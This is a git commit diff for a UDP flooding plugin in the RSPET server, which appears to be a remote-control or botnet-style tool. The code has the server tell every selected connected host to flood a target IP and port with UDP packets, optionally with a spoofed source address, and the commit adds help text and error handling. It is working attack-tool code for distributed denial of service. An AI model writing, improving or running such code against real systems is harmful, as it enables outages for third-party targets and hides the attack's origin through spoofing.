3fe58764951d7d3b550c5b08cde9b5d81f3ade1a
Kolokotronis Panagiotis <panos122008@gmail.com>
2016-08-23 23:40:36 +0300

    Update udp.py
    Removed __host_commands__ (see mount.py for more info as to why)
    Added __help__ with syntax help for each function
    Stability/Reliability improvements, added more checks and error handling

--- Server/Plugins/udp.py
+++ Server/Plugins/udp.py
@@ -1,43 +1,69 @@
-from mount import Plugin
+"""
+Plug-in module for RSPET server. Offer functions related to udp flooding.
+"""
+from __future__ import print_function
+from socket import error as sock_error
+from Plugins.mount import Plugin
 
 class Files(Plugin):
+    """
+    Class expanding Plugin.
+    """
     __server_commands__ = {}
-    __host_commands__ = {}
+    __cmd_help__ = {}
 
     def __init__(self):
-        self.__host_commands__["UDP_Flood"] = [self.udp_flood, "connected",
+        """
+        Declare plugin's CLI commands their syntax and their scope.
+        """
+        self.__server_commands__["UDP_Flood"] = [self.udp_flood, "connected",
                                                "multiple"]
-        self.__host_commands__["UDP_Spoof"] = [self.udp_spoof, "connected",
+        self.__cmd_help__["UDP_Flood"] =\
+        "UDP_Flood <target_ip> <target_port> [payload]"
+        self.__server_commands__["UDP_Spoof"] = [self.udp_spoof, "connected",
                                                "multiple"]
+        self.__cmd_help__["UDP_Spoof"] =\
+        "UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]"
 
-    def udp_flood(self, host, args):
+    def udp_flood(self, server, args):
         """Flood target machine with UDP packets"""
+        hosts = server.get_selected()
+        state = None
         if len(args) < 2:
             print("Usage: UDP_Flood <target_ip> <target_port> [payload]")
+        else:
+            try:
+                # IP:port:payload
+                cmd = "%s:%s:%s" % (args[0], args[1], args[2])
+            except IndexError:
+                cmd = "%s:%s:Hi" % (args[0], args[1])
+            for host in hosts:
+                try:
+                    host.send(host.command_dict['udpFlood'])
+                    host.send("%03d" % len(cmd))
+                    host.send(cmd)
+                except sock_error:
+                    state = "basic"
+        return state
 
-        try:
-            # IP:port:payload
-            cmd = "%s:%s:%s" % (args[0], args[1], args[2])
-        except IndexError:
-            cmd = "%s:%s:Hi" % (args[0], args[1])
-
-        host.send(host.command_dict['udpFlood'])
-        host.send("%03d" % len(cmd))
-        host.send(cmd)
-        return None
-
-    def udp_spoof(self, host, args):
+    def udp_spoof(self, server, args):
         """Flood target machine with UDP packets via spoofed ip & port"""
+        hosts = server.get_selected()
+        state = None
         if len(args) < 4:
-            print("Usage: UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]")
-
-        try:
-            # IP:port:new_ip:new_port:payload
-            cmd = "%s:%s:%s:%s:%s" % (args[0], args[1], args[2], args[3], args[4])
-        except IndexError:
-            cmd = "%s:%s:%s:%s:Hi" % (args[0], args[1], args[2], args[3])
-
-        host.send(host.command_dict['udpSpoof'])
-        host.send("%03d" % len(cmd))
-        host.send(cmd)
-        return None
+            print("Usage: UDP_Spoof <target_ip> <target_port> <spoofed_ip>\
+                  <spoofed_port> [payload]")
+        else:
+            try:
+                # IP:port:new_ip:new_port:payload
+                cmd = "%s:%s:%s:%s:%s" % (args[0], args[1], args[2], args[3], args[4])
+            except IndexError:
+                cmd = "%s:%s:%s:%s:Hi" % (args[0], args[1], args[2], args[3])
+            for host in hosts:
+                try:
+                    host.send(host.command_dict['udpSpoof'])
+                    host.send("%03d" % len(cmd))
+                    host.send(cmd)
+                except sock_error:
+                    state = "basic"
+        return state
